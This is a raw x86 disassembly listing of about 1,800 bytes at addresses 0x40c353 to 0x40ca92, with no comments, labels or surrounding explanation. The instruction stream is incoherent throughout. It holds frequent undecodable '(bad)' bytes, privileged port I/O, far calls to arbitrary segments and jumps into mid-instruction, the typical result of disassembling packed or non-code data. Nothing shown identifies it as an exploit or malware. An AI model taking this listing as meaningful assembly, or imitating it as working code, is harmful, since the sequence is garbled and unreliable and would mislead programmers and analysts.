  40c353:	xchg   esi,eax
  40c354:	jo     0x40c348
  40c356:	aad    0xdd
  40c358:	push   esi
  40c359:	shl    dl,1
  40c35b:	adc    BYTE PTR [edi],0x5d
  40c35e:	adc    edi,DWORD PTR [ebx+0x2eba23f7]
  40c364:	ret    0x9d4e
  40c367:	iret   
  40c368:	or     bh,cl
  40c36a:	xor    DWORD PTR [edi-0x33598a0],edi
  40c370:	dec    esp
  40c371:	fld    DWORD PTR [ebp-0x7033f14d]
  40c377:	loopne 0x40c303
  40c379:	mov    esp,0xb32819ef
  40c37e:	jle    0x40c3ba
  40c380:	pop    edi
  40c381:	push   ds
  40c382:	ret    0x874e
  40c385:	pop    ds
  40c386:	jecxz  0x40c381
  40c388:	and    edx,esp
  40c38a:	sub    bh,BYTE PTR ds:0xb184469d
  40c390:	mov    bh,0x75
  40c392:	sbb    ebp,DWORD PTR [edi+0xb]
  40c395:	mov    eax,0xb26aada7
  40c39a:	dec    edx
  40c39b:	xor    BYTE PTR [eax],ah
  40c39d:	scas   al,BYTE PTR es:[edi]
  40c39e:	mov    ch,cl
  40c3a0:	cmc    
  40c3a1:	pop    es
  40c3a2:	push   edx
  40c3a3:	inc    edi
  40c3a4:	jg     0x40c3fb
  40c3a6:	adc    DWORD PTR [esi+0x76c0afd5],edi
  40c3ac:	xchg   esp,eax
  40c3ad:	fld    QWORD PTR [ebx-0x34]
  40c3b0:	scas   eax,DWORD PTR es:[edi]
  40c3b1:	pop    es
  40c3b2:	rcl    bl,1
  40c3b4:	add    bl,al
  40c3b6:	sbb    edx,ebp
  40c3b8:	out    dx,eax
  40c3b9:	sar    BYTE PTR [edx+0x4ba63008],1
  40c3bf:	repz mov esi,es
  40c3c2:	dec    esp
  40c3c3:	dec    ebp
  40c3c4:	repnz xlat BYTE PTR ds:[ebx]
  40c3c7:	inc    esp
  40c3c8:	aad    0x9f
  40c3ca:	shl    BYTE PTR [ebx],0x43
  40c3cd:	mov    BYTE PTR [ecx+ebx*1],ah
  40c3d0:	inc    ebx
  40c3d1:	stc    
  40c3d2:	jecxz  0x40c363
  40c3d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3d5:	dec    esi
  40c3d6:	daa    
  40c3d7:	mov    bl,0x5e
  40c3d9:	jno    0x40c3a6
  40c3db:	call   DWORD PTR [ecx]
  40c3dd:	mov    bh,0xdd
  40c3df:	xor    DWORD PTR [ebp+0x7a4e9ba4],ebx
  40c3e5:	inc    ecx
  40c3e6:	call   0x4957:0xeefac561
  40c3ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3ee:	ret    0xc341
  40c3f1:	dec    ebx
  40c3f2:	add    DWORD PTR [edi],0x59f1cf4
  40c3f8:	and    al,0x34
  40c3fa:	into   
  40c3fb:	cmp    BYTE PTR ds:0x129bec1f,0xb6
  40c402:	cmp    dl,al
  40c404:	push   esi
  40c405:	clc    
  40c406:	xor    BYTE PTR [ecx+0x3f],dh
  40c409:	xor    ch,BYTE PTR [edx-0x5f]
  40c40c:	mov    edi,0x1d2a4522
  40c411:	xchg   edx,eax
  40c412:	repz push edx
  40c414:	sub    esi,DWORD PTR [esi+0x3aaa0766]
  40c41a:	mov    ebx,0x5f33a0f3
  40c41f:	out    dx,eax
  40c420:	inc    ebp
  40c421:	push   DWORD PTR [edi+0x53]
  40c424:	std    
  40c425:	and    dh,0xd5
  40c428:	or     ebx,DWORD PTR [eax+edi*2+0x30]
  40c42c:	inc    edi
  40c42d:	daa    
  40c42e:	fdiv   QWORD PTR [ecx-0x59]
  40c431:	cs push edi
  40c433:	gs leave 
  40c435:	das    
  40c436:	lods   eax,DWORD PTR ds:[esi]
  40c437:	xchg   ecx,eax
  40c438:	lock jne 0xeb7e55e4
  40c43f:	pop    edx
  40c440:	and    al,BYTE PTR [edx*2+0x1b801ad0]
  40c447:	dec    esp
  40c448:	push   eax
  40c449:	(bad)  
  40c44a:	fsubr  QWORD PTR [eax+eax*4]
  40c44d:	cld    
  40c44e:	pop    ebp
  40c44f:	dec    ebp
  40c450:	call   DWORD PTR [ebx+0x9b857ae]
  40c456:	fld    DWORD PTR [ecx+0x4faec8f]
  40c45c:	mov    bl,0x94
  40c45e:	or     ch,bl
  40c460:	sub    dh,BYTE PTR [eax+ebx*8+0x4fed470d]
  40c467:	loope  0x40c465
  40c469:	pop    ecx
  40c46a:	xor    al,0x13
  40c46c:	mul    DWORD PTR ds:0xa18abada
  40c472:	ret    0x4a4e
  40c475:	leave  
  40c476:	pusha  
  40c477:	or     dh,dh
  40c479:	cwde   
  40c47a:	out    0xdb,eax
  40c47c:	add    al,BYTE PTR [eax+esi*2+0x20]
  40c480:	cld    
  40c481:	rcr    BYTE PTR [ebx],1
  40c483:	xor    BYTE PTR [edx-0x1c9b29dc],0xee
  40c48a:	imul   edi,DWORD PTR [ebx+ebx*1-0x2869c858],0xffffff8c
  40c492:	jae    0x40c426
  40c494:	cmp    al,0x9c
  40c496:	xlat   BYTE PTR ds:[ebx]
  40c497:	xchg   edi,eax
  40c498:	mov    edi,0xb9885c97
  40c49d:	jne    0x40c471
  40c49f:	loop   0x40c4e4
  40c4a1:	pop    es
  40c4a2:	pop    edx
  40c4a3:	(bad)  
  40c4a4:	imul   ebx,ecx,0x57c2652e
  40c4aa:	ret    0x3f15
  40c4ad:	stc    
  40c4ae:	adc    esp,DWORD PTR [esi+0x22]
  40c4b1:	xlat   BYTE PTR ds:[ebx]
  40c4b2:	pop    ss
  40c4b3:	push   ebp
  40c4b4:	push   edx
  40c4b5:	xchg   edx,eax
  40c4b6:	jge    0x40c4be
  40c4b8:	xchg   edi,eax
  40c4b9:	or     esp,ecx
  40c4bb:	retf   
  40c4bc:	jo     0x40c4f9
  40c4be:	sbb    al,0x6e
  40c4c0:	xchg   ecx,eax
  40c4c1:	iret   
  40c4c2:	call   0x94b4:0x9e2e3d06
  40c4c9:	adc    DWORD PTR [eax+0x4fbe6e0b],ebp
  40c4cf:	adc    dh,al
  40c4d1:	test   DWORD PTR [edx+0x73f55473],edi
  40c4d7:	lea    ebp,[edx+eiz*1+0x69]
  40c4db:	int3   
  40c4dc:	xor    ch,dh
  40c4de:	int3   
  40c4df:	pop    ds
  40c4e0:	and    eax,0xfadcbeda
  40c4e5:	fld    QWORD PTR es:[ebp-0x2f]
  40c4e9:	sub    BYTE PTR [ebp-0x3],cl
  40c4ec:	cmp    dl,BYTE PTR [ebx-0x4d]
  40c4ef:	or     al,0x9f
  40c4f1:	hlt    
  40c4f2:	pop    edi
  40c4f3:	mov    BYTE PTR [ebp+0x10],0x5f
  40c4f7:	and    ebp,DWORD PTR [eax+0x59b19048]
  40c4fd:	xor    al,0x52
  40c4ff:	xor    eax,0xbb86f2b5
  40c504:	or     edx,esp
  40c506:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c507:	push   esi
  40c508:	mov    WORD PTR [ecx],ss
  40c50a:	imul   ecx,DWORD PTR ds:0xccd12b9e,0xb00c7c3e
  40c514:	in     eax,dx
  40c515:	adc    al,0xc3
  40c517:	std    
  40c518:	or     al,0x4d
  40c51a:	lock push ebp
  40c51c:	add    ebp,ebp
  40c51e:	mov    ebp,0xd6b0a037
  40c523:	test   al,0x7c
  40c525:	mov    ebp,0xc059330a
  40c52a:	xchg   ebp,eax
  40c52b:	or     al,0x26
  40c52d:	pop    esp
  40c52e:	jmp    0x40c4f6
  40c530:	mov    eax,0x46c57dab
  40c535:	ret    0x3810
  40c538:	imul   esp,esi,0xffffff9b
  40c53b:	mov    cl,0xb7
  40c53d:	inc    eax
  40c53e:	shl    DWORD PTR [edi],cl
  40c540:	imul   edi,DWORD PTR [ebx+0x464a2bde],0xfffffffb
  40c547:	imul   edx,DWORD PTR [edi],0xdef03bd1
  40c54d:	adc    DWORD PTR [edx+0x4b36636e],0x15
  40c554:	pop    ds
  40c555:	les    ecx,FWORD PTR [edi-0x34]
  40c558:	test   eax,0x54f7253b
  40c55d:	jo     0x40c5bd
  40c55f:	daa    
  40c560:	das    
  40c561:	push   edi
  40c562:	sub    eax,0x2746d601
  40c567:	inc    edi
  40c568:	xchg   edx,eax
  40c569:	fucom  st(5)
  40c56b:	add    BYTE PTR [edx],0xbb
  40c56e:	sar    DWORD PTR [edi+0x36],cl
  40c571:	lods   eax,DWORD PTR ds:[esi]
  40c572:	bound  edi,QWORD PTR [edx-0x1a55bf79]
  40c578:	or     DWORD PTR [ecx+0x10ffa516],0x511573fb
  40c582:	inc    esi
  40c583:	popf   
  40c584:	pop    edx
  40c585:	push   0xffffffae
  40c587:	arpl   WORD PTR [ebx-0x1a],ax
  40c58a:	dec    esp
  40c58b:	add    ch,bl
  40c58d:	pusha  
  40c58e:	push   ebx
  40c58f:	call   0xc908:0x1fdf3efd
  40c596:	out    0x7d,al
  40c598:	loopne 0x40c5a5
  40c59a:	out    0x5e,al
  40c59c:	mov    edx,0x2ab96447
  40c5a1:	loope  0x40c5cc
  40c5a3:	aaa    
  40c5a4:	pop    esi
  40c5a5:	adc    dl,BYTE PTR [esi-0x196116d0]
  40c5ab:	pop    ecx
  40c5ac:	aaa    
  40c5ad:	xchg   edx,eax
  40c5ae:	xlat   BYTE PTR ds:[ebx]
  40c5af:	repnz out dx,al
  40c5b1:	and    DWORD PTR [ebx],eax
  40c5b3:	inc    edi
  40c5b4:	scas   al,BYTE PTR es:[edi]
  40c5b5:	xchg   ebp,eax
  40c5b6:	xchg   BYTE PTR [ecx-0x29182693],ch
  40c5bc:	cmp    eax,0x213f7f5a
  40c5c1:	dec    ecx
  40c5c2:	xchg   ebp,eax
  40c5c3:	shl    BYTE PTR [edi+0x0],0xdd
  40c5c7:	push   0xe2a79287
  40c5cc:	adc    ah,BYTE PTR [esi+0x16]
  40c5cf:	fcomp  DWORD PTR [ecx]
  40c5d1:	outs   dx,DWORD PTR ds:[esi]
  40c5d2:	lea    esp,[edx+0x18442e57]
  40c5d8:	add    DWORD PTR [esi],ecx
  40c5da:	mov    ecx,0xdff21ef6
  40c5df:	jl     0x40c5de
  40c5e1:	or     al,0x69
  40c5e3:	push   ss
  40c5e4:	xor    ecx,ebp
  40c5e6:	cmp    eax,0x53774c27
  40c5eb:	adc    al,0xa1
  40c5ed:	push   cs
  40c5ee:	adc    BYTE PTR [eax],bl
  40c5f0:	pop    ecx
  40c5f1:	xchg   eax,eax
  40c5f3:	jmp    0x93ff056
  40c5f8:	mov    bh,0x4f
  40c5fa:	and    al,0xf0
  40c5fc:	xor    eax,0x12eaca0f
  40c601:	test   BYTE PTR [edx],bh
  40c603:	enter  0xcd95,0x21
  40c607:	aad    0xc2
  40c609:	out    dx,al
  40c60a:	outs   dx,BYTE PTR ds:[esi]
  40c60b:	mov    cl,0xc9
  40c60d:	push   edi
  40c60e:	sbb    eax,0xc810c056
  40c613:	or     al,0xad
  40c615:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40c617:	lods   eax,DWORD PTR ds:[esi]
  40c618:	std    
  40c619:	and    eax,0x1c5bcc1a
  40c61e:	retf   
  40c61f:	mov    es,WORD PTR [ecx+0x5c]
  40c622:	lods   eax,DWORD PTR ds:[esi]
  40c623:	mov    edx,0x29877daa
  40c628:	xor    BYTE PTR [ebx+0x5c53e906],al
  40c62e:	pushf  
  40c62f:	or     edi,0x8f4072b0
  40c635:	out    dx,eax
  40c636:	and    ch,dh
  40c638:	push   es
  40c639:	cmp    eax,0x45564981
  40c63e:	in     eax,0xa9
  40c640:	lahf   
  40c641:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c643:	test   al,0x27
  40c645:	scas   al,BYTE PTR es:[edi]
  40c646:	jl     0x40c642
  40c648:	shr    bh,cl
  40c64a:	push   esp
  40c64b:	sbb    DWORD PTR [esi+0x4d],esi
  40c64e:	in     eax,0x10
  40c650:	loope  0x40c604
  40c652:	dec    esp
  40c653:	sbb    esi,esi
  40c655:	scas   al,BYTE PTR es:[edi]
  40c656:	cld    
  40c657:	ins    BYTE PTR es:[edi],dx
  40c658:	scas   eax,DWORD PTR es:[edi]
  40c659:	cdq    
  40c65a:	inc    esp
  40c65b:	pop    eax
  40c65c:	(bad)  
  40c65e:	retf   
  40c65f:	stos   BYTE PTR es:[edi],al
  40c660:	xor    BYTE PTR [eax],dl
  40c662:	push   edx
  40c663:	idiv   BYTE PTR [ecx]
  40c665:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c666:	and    DWORD PTR [edx+0x6b6efffa],esi
  40c66c:	adc    DWORD PTR [ecx-0xf],0x60eeacbd
  40c673:	loop   0x40c629
  40c675:	cld    
  40c676:	ret    
  40c677:	out    0x16,eax
  40c679:	mov    ch,0x75
  40c67b:	or     edi,DWORD PTR [eax-0x337751bd]
  40c681:	sub    edi,eax
  40c683:	jecxz  0x40c606
  40c685:	stc    
  40c686:	and    eax,0xed929dfa
  40c68b:	cmp    BYTE PTR [edx],bl
  40c68d:	jae    0x40c619
  40c68f:	cmc    
  40c690:	aas    
  40c691:	int    0xe9
  40c693:	(bad)  
  40c694:	fistp  QWORD PTR [ebx+ecx*1+0x7fd0e0de]
  40c69b:	mov    bh,0x31
  40c69d:	mov    ebx,0x7d69ba0b
  40c6a2:	pop    edx
  40c6a3:	int    0xca
  40c6a5:	sub    eax,DWORD PTR [esi]
  40c6a7:	jmp    0x9f59e2a1
  40c6ac:	loope  0x40c68f
  40c6ae:	mov    DWORD PTR [eax],eax
  40c6b0:	xor    DWORD PTR [edx],edi
  40c6b2:	jge    0x40c6b7
  40c6b4:	adc    eax,0x8975b067
  40c6b9:	sbb    dh,BYTE PTR [edx+eax*4+0x43fee7e1]
  40c6c0:	adc    bl,ch
  40c6c2:	sbb    al,0x62
  40c6c4:	ja     0x40c64d
  40c6c6:	sbb    al,0x6f
  40c6c8:	pop    edi
  40c6c9:	sbb    eax,0xa96e25b5
  40c6ce:	mov    fs,ebp
  40c6d0:	jnp    0x40c73d
  40c6d2:	xor    al,0x96
  40c6d4:	dec    esi
  40c6d5:	int    0x1e
  40c6d7:	pop    edx
  40c6d8:	cwde   
  40c6d9:	add    esp,0x6e
  40c6dc:	popf   
  40c6dd:	icebp  
  40c6de:	xor    eax,0x8596f3ee
  40c6e3:	ins    DWORD PTR es:[edi],dx
  40c6e4:	sub    ebx,DWORD PTR [ecx-0x152d809d]
  40c6ea:	imul   esi,DWORD PTR [edx-0x74],0xd08e4ac0
  40c6f1:	iret   
  40c6f2:	call   0x5ecb9b32
  40c6f7:	fnstenv [edi-0x49]
  40c6fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6fb:	cmp    al,0xb3
  40c6fd:	push   edi
  40c6fe:	inc    edi
  40c6ff:	int    0x0
  40c701:	or     edx,esp
  40c703:	push   esp
  40c704:	dec    ebx
  40c705:	push   0x3a57c0d7
  40c70a:	xlat   BYTE PTR gs:[ebx]
  40c70c:	mov    esi,0xf78df409
  40c711:	jae    0x40c765
  40c713:	and    DWORD PTR ds:0x45dd8d0d,edx
  40c719:	dec    esi
  40c71a:	fucom  st(3)
  40c71c:	jecxz  0x40c6ce
  40c71e:	inc    ebp
  40c71f:	or     al,0x71
  40c721:	fdiv   QWORD PTR [ebx]
  40c723:	pop    edi
  40c724:	sti    
  40c725:	dec    BYTE PTR ds:0x1a88bed2
  40c72b:	and    DWORD PTR [ecx+0x5d89a0ae],esi
  40c731:	push   edx
  40c732:	push   ss
  40c733:	(bad)  
  40c734:	in     eax,dx
  40c735:	jmp    0x731a:0x4fc343c9
  40c73c:	nop
  40c73d:	dec    esp
  40c73e:	jle    0x40c7b9
  40c740:	out    0x4d,eax
  40c742:	scas   eax,DWORD PTR es:[edi]
  40c743:	in     eax,0xf3
  40c745:	mov    edx,0xeace3624
  40c74a:	jecxz  0x40c6e8
  40c74c:	js     0x40c726
  40c74e:	mov    bl,0x49
  40c750:	pop    DWORD PTR [esi+0x7b]
  40c753:	and    cx,WORD PTR [esi-0x22]
  40c757:	(bad)  [ebp+0x39]
  40c75a:	jge    0x40c6f6
  40c75c:	cld    
  40c75d:	(bad)  
  40c75e:	and    dl,al
  40c760:	push   ss
  40c761:	aaa    
  40c762:	add    DWORD PTR [edi-0x51],0x28
  40c766:	mov    dh,0x98
  40c768:	call   0x8bd3a3b2
  40c76d:	dec    ebp
  40c76e:	cli    
  40c76f:	and    ebp,eax
  40c771:	stos   BYTE PTR es:[edi],al
  40c772:	rcr    DWORD PTR [edi-0x2e],1
  40c775:	leave  
  40c776:	add    ah,bh
  40c778:	aam    0xc7
  40c77a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c77b:	sar    BYTE PTR [edx],0x0
  40c77e:	call   0x8f2c7b72
  40c783:	aaa    
  40c784:	and    al,0x33
  40c786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c788:	lock (bad) 
  40c78a:	std    
  40c78b:	adc    DWORD PTR [ecx+0x4af02a28],eax
  40c791:	pop    ebp
  40c792:	cmp    esp,DWORD PTR [esi]
  40c794:	ret    
  40c795:	ret    0x4e77
  40c798:	push   eax
  40c799:	or     esi,0x73
  40c79c:	xchg   ecx,eax
  40c79d:	into   
  40c79e:	cmovp  ebp,DWORD PTR [ebx+0x21]
  40c7a2:	stos   DWORD PTR es:[edi],eax
  40c7a3:	cmp    BYTE PTR [ebp+0x3f],ch
  40c7a6:	test   cx,dx
  40c7a9:	push   es
  40c7aa:	hlt    
  40c7ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7ac:	cli    
  40c7ad:	jp     0x40c736
  40c7af:	ret    0xe829
  40c7b2:	lods   eax,DWORD PTR ds:[esi]
  40c7b3:	retf   
  40c7b4:	out    0x12,eax
  40c7b6:	mov    bl,0xbc
  40c7b8:	mov    ebx,DWORD PTR [edi-0x7c]
  40c7bb:	xor    DWORD PTR [esi+esi*4],edi
  40c7be:	jmp    0x40c78c
  40c7c0:	test   ebx,ebx
  40c7c2:	sub    al,0x83
  40c7c4:	or     dh,dh
  40c7c6:	mov    bh,bl
  40c7c8:	ja     0x40c841
  40c7ca:	xor    DWORD PTR [edx-0x6b09fd01],edi
  40c7d0:	dec    esi
  40c7d1:	push   esi
  40c7d2:	stos   BYTE PTR es:[edi],al
  40c7d3:	jo     0x40c84a
  40c7d5:	popa   
  40c7d6:	jbe    0x40c830
  40c7d8:	xchg   esi,eax
  40c7d9:	scas   eax,DWORD PTR es:[edi]
  40c7da:	push   ds
  40c7db:	pop    ebp
  40c7dc:	lock xchg esp,eax
  40c7de:	dec    ecx
  40c7df:	or     eax,0xff21ea9
  40c7e4:	fidivr WORD PTR [ebx]
  40c7e6:	aam    0xd4
  40c7e8:	mov    edx,esi
  40c7ea:	lds    ecx,FWORD PTR [ebp-0x46679997]
  40c7f0:	clc    
  40c7f1:	pop    ss
  40c7f2:	mov    esp,0x8a8c5831
  40c7f7:	jmp    0x6f9c:0x26818c43
  40c7fe:	rol    BYTE PTR [edx+0x5274daa4],cl
  40c804:	jnp    0x40c829
  40c806:	in     al,0xaa
  40c808:	sub    DWORD PTR [ebp-0x1d],eax
  40c80b:	xor    BYTE PTR [edx+0x26],dl
  40c80e:	xchg   ecx,eax
  40c80f:	add    bh,dl
  40c811:	sar    BYTE PTR [edi+0x7100a14f],1
  40c817:	pop    esi
  40c818:	cmc    
  40c819:	test   DWORD PTR [ebx+0x505bd778],ebx
  40c81f:	ror    BYTE PTR [esi+0x500a5cf5],0xd9
  40c826:	stos   BYTE PTR es:[edi],al
  40c827:	cld    
  40c828:	xchg   ecx,eax
  40c829:	int    0xc7
  40c82b:	and    DWORD PTR fs:0x8d00e90f,edi
  40c832:	int    0xf6
  40c834:	rcl    DWORD PTR [edi-0x207e4b6d],1
  40c83a:	cs sub al,0x12
  40c83d:	sub    bl,ah
  40c83f:	mov    ebx,0x118669ab
  40c844:	stos   DWORD PTR es:[edi],eax
  40c845:	mov    al,ds:0x5fd45575
  40c84a:	out    dx,al
  40c84b:	ror    DWORD PTR [eax],0xab
  40c84e:	sub    DWORD PTR [eiz*1+0x2bd8e98c],edi
  40c855:	mov    ds:0xd94e3f08,eax
  40c85a:	mov    ecx,DWORD PTR [edi]
  40c85c:	xchg   edi,eax
  40c85d:	cld    
  40c85e:	add    BYTE PTR [ebp-0x4f],bl
  40c861:	aad    0x2d
  40c863:	into   
  40c864:	into   
  40c865:	xchg   edi,eax
  40c866:	cwde   
  40c867:	sar    ch,cl
  40c869:	fs xchg ebp,eax
  40c86b:	sar    BYTE PTR [ebx],1
  40c86d:	sub    eax,0xa5f04a70
  40c872:	std    
  40c873:	ins    BYTE PTR es:[edi],dx
  40c874:	xlat   BYTE PTR ds:[ebx]
  40c875:	dec    ecx
  40c876:	out    0xb6,al
  40c878:	inc    ecx
  40c879:	icebp  
  40c87a:	fcomp  st(3)
  40c87c:	neg    ebp
  40c87e:	(bad)
  40c881:	fcom   DWORD PTR [eax+0x3]
  40c884:	pop    es
  40c885:	das    
  40c886:	push   0x1d
  40c888:	sub    BYTE PTR [ebx+0x5215a4dc],0x90
  40c88f:	cmp    al,0x24
  40c891:	push   ss
  40c892:	add    al,0x9e
  40c894:	scas   al,BYTE PTR es:[edi]
  40c895:	cmc    
  40c896:	mov    eax,0xe4ed20b1
  40c89b:	lock popa 
  40c89d:	aas    
  40c89e:	push   cs
  40c89f:	pop    ds
  40c8a0:	or     ah,cl
  40c8a2:	js     0x40c8e1
  40c8a4:	outs   dx,DWORD PTR ds:[esi]
  40c8a5:	sub    DWORD PTR [ebx],ecx
  40c8a7:	out    dx,al
  40c8a8:	ret    0x7188
  40c8ab:	push   ds
  40c8ac:	retf   
  40c8ad:	dec    ecx
  40c8ae:	inc    eax
  40c8af:	add    al,BYTE PTR [edx-0x48]
  40c8b2:	push   ebp
  40c8b3:	ds jae 0x40c8de
  40c8b6:	fs mov ?,esi
  40c8b9:	jo     0x40c872
  40c8bb:	(bad)  [edx]
  40c8bd:	gs jae 0x40c865
  40c8c0:	stos   BYTE PTR es:[edi],al
  40c8c1:	xchg   esp,eax
  40c8c2:	xor    eax,esi
  40c8c4:	or     DWORD PTR [ebp-0x65],eax
  40c8c7:	cld    
  40c8c8:	stos   DWORD PTR es:[edi],eax
  40c8c9:	add    DWORD PTR [edx-0x2b],esp
  40c8cc:	or     DWORD PTR [edi+0x25],esp
  40c8cf:	dec    ebx
  40c8d0:	mov    bl,0x82
  40c8d2:	push   esp
  40c8d3:	in     al,dx
  40c8d4:	scas   al,BYTE PTR es:[edi]
  40c8d5:	popa   
  40c8d6:	xor    dl,BYTE PTR [ecx+eiz*8-0x4f]
  40c8da:	cdq    
  40c8db:	pop    es
  40c8dc:	dec    eax
  40c8dd:	sbb    dl,BYTE PTR [ebp*8-0x21e4f50a]
  40c8e4:	rcr    DWORD PTR [eax],1
  40c8e6:	repz inc esp
  40c8e8:	ins    DWORD PTR es:[edi],dx
  40c8e9:	sahf   
  40c8ea:	inc    eax
  40c8eb:	out    0xf4,al
  40c8ed:	lea    ebx,[ebx]
  40c8ef:	retf   
  40c8f0:	adc    al,0x1b
  40c8f2:	ins    BYTE PTR es:[edi],dx
  40c8f3:	in     eax,0x8f
  40c8f5:	fst    DWORD PTR [ebp-0x64ac1e2]
  40c8fb:	aas    
  40c8fc:	xchg   esi,eax
  40c8fd:	mov    bl,0x68
  40c8ff:	in     al,0xe3
  40c901:	mov    ch,BYTE PTR [ecx+0xe738c46]
  40c907:	(bad)
  40c90a:	push   cs
  40c90b:	jmp    0xfe3c:0x39efc0a
  40c912:	mov    eax,0x6b010cfe
  40c917:	mov    esi,0xa0b92caa
  40c91c:	into   
  40c91d:	mov    ebp,0xe51a95
  40c922:	mov    edx,0xd951314c
  40c927:	aam    0xdb
  40c929:	bound  esi,QWORD PTR [edi+0x27]
  40c92c:	push   0x648c6291
  40c931:	dec    eax
  40c932:	mov    BYTE PTR [edx+0x5f],dl
  40c935:	cld    
  40c936:	addr16 not ch
  40c939:	fisubr WORD PTR [ecx-0x3b]
  40c93c:	sbb    BYTE PTR [esi+0x56],dh
  40c93f:	jae    0x40c947
  40c941:	(bad)  
  40c942:	repz (bad) 
  40c944:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c945:	sbb    ch,0xb8
  40c948:	jmp    FWORD PTR [ecx]
  40c94a:	out    0xf4,eax
  40c94c:	push   0x5f
  40c94e:	loope  0x40c9a7
  40c950:	icebp  
  40c951:	inc    ebx
  40c952:	daa    
  40c953:	sar    BYTE PTR [ebx-0x66],1
  40c956:	jmp    0x80db:0xfe837f09
  40c95d:	cmp    eax,0x269d73f4
  40c962:	test   BYTE PTR [edi-0x6f],ah
  40c965:	addr16 push ds
  40c967:	loopne 0x40c987
  40c969:	ret    0x1b16
  40c96c:	retf   0xdc8c
  40c96f:	xor    BYTE PTR [edx],0x14
  40c972:	and    BYTE PTR [esi+0x24],bl
  40c975:	cli    
  40c976:	inc    edi
  40c977:	leave  
  40c978:	mov    edx,0xc541319d
  40c97d:	push   ebp
  40c97e:	push   esp
  40c97f:	dec    esp
  40c980:	pop    edx
  40c981:	xchg   esi,eax
  40c982:	sbb    DWORD PTR [ebp-0x2e],eax
  40c985:	pushf  
  40c986:	and    eax,0x568e6ac7
  40c98b:	gs fs inc ebx
  40c98e:	ror    BYTE PTR fs:[eax+0x50517e4e],0x33
  40c996:	sbb    cl,0x82
  40c999:	and    al,0x77
  40c99b:	je     0x40c9bc
  40c99d:	nop
  40c99e:	sbb    DWORD PTR [esi],esi
  40c9a0:	and    esi,DWORD PTR [esi-0x47]
  40c9a3:	stc    
  40c9a4:	mov    dl,0xa8
  40c9a6:	mov    eax,0x3d3072da
  40c9ab:	push   0xf
  40c9ad:	outs   dx,DWORD PTR ds:[esi]
  40c9ae:	or     bh,BYTE PTR [eax]
  40c9b0:	mov    BYTE PTR [esi+0x32],ch
  40c9b3:	pop    esi
  40c9b4:	mov    esi,0xb44114de
  40c9b9:	in     al,0xf2
  40c9bb:	sbb    dl,bh
  40c9bd:	jae    0x40c9af
  40c9bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9c0:	rcl    BYTE PTR [esi+0x13],1
  40c9c3:	xor    eax,0x95554b2
  40c9c8:	dec    ebx
  40c9c9:	sub    cl,BYTE PTR gs:0x6eff5f22
  40c9d0:	sti    
  40c9d1:	retf   
  40c9d2:	or     BYTE PTR [edi+0x52],dh
  40c9d5:	push   ecx
  40c9d6:	bound  edx,QWORD PTR [ebx+0x98d178e]
  40c9dc:	or     eax,0x91c86aee
  40c9e1:	xchg   DWORD PTR [esi+0x3d],esi
  40c9e4:	mov    BYTE PTR [ecx+0x3a],ch
  40c9e7:	loopne 0x40c98d
  40c9e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9ea:	jg     0x40ca15
  40c9ec:	and    cl,BYTE PTR [esi+0x37ebc7a1]
  40c9f2:	pop    edi
  40c9f3:	cmp    BYTE PTR [eax-0x54315989],al
  40c9f9:	outs   dx,DWORD PTR ds:[esi]
  40c9fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9fb:	ret    
  40c9fc:	daa    
  40c9fd:	jl     0x40c9bc
  40c9ff:	cmp    BYTE PTR [ebx-0x570737f5],dh
  40ca05:	stos   DWORD PTR es:[edi],eax
  40ca06:	pop    es
  40ca07:	and    ah,BYTE PTR [edi-0x64343722]
  40ca0d:	inc    esi
  40ca0e:	stc    
  40ca0f:	sahf   
  40ca10:	rcl    DWORD PTR [ecx+0x4bc9b8e0],0xe2
  40ca17:	inc    ebp
  40ca18:	or     eax,0x2bdf65f
  40ca1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca1e:	imul   esi,DWORD PTR [esi+edx*4-0x34],0x62
  40ca23:	in     al,dx
  40ca24:	mov    ebp,DWORD PTR [edx]
  40ca26:	pop    es
  40ca27:	pop    ecx
  40ca28:	pop    edx
  40ca29:	sub    BYTE PTR [edx+0x33f27e7c],bh
  40ca2f:	sbb    BYTE PTR [eax+0x22c13fcd],dh
  40ca35:	jmp    0x40ca35
  40ca37:	jge    0x40ca92
  40ca39:	popf   
  40ca3a:	int    0x3b
  40ca3c:	call   0xeff9dbf8
  40ca41:	in     al,dx
  40ca42:	add    ecx,edx
  40ca44:	xor    dl,bl
  40ca46:	xlat   BYTE PTR ds:[ebx]
  40ca47:	or     BYTE PTR [ebx+ecx*8+0x176c7e1c],dh
  40ca4e:	xchg   ebx,eax
  40ca4f:	clc    
  40ca50:	mov    edi,0xef2607e6
  40ca55:	xchg   edx,eax
  40ca56:	and    edx,edi
  40ca58:	adc    DWORD PTR [ebp+0x2f],ecx
  40ca5b:	sahf   
  40ca5c:	pushf  
  40ca5d:	(bad)  
  40ca5e:	int3   
  40ca5f:	or     eax,0xbe963b94
  40ca64:	mov    ch,0x42
  40ca66:	mov    ebx,0xa83ad92c
  40ca6b:	add    BYTE PTR [eax-0x24114e0d],ch
  40ca71:	dec    edx
  40ca72:	jnp    0x40ca58
  40ca74:	sub    bl,BYTE PTR [ebp-0x42]
  40ca77:	gs push cs
  40ca79:	xor    edi,DWORD PTR [edx+eax*1]
  40ca7c:	das    
  40ca7d:	pop    esp
  40ca7e:	lds    esi,FWORD PTR [esi]
  40ca80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca81:	or     eax,0x493d2daf
  40ca86:	js     0x40ca73
  40ca88:	mov    dh,0x5a
  40ca8a:	hlt    
  40ca8b:	cwde   
  40ca8c:	adc    al,0xb6
  40ca8e:	cdq    
  40ca8f:	push   ss
  40ca90:	dec    ch
  40ca92:	add    DWORD PTR [esi],edi
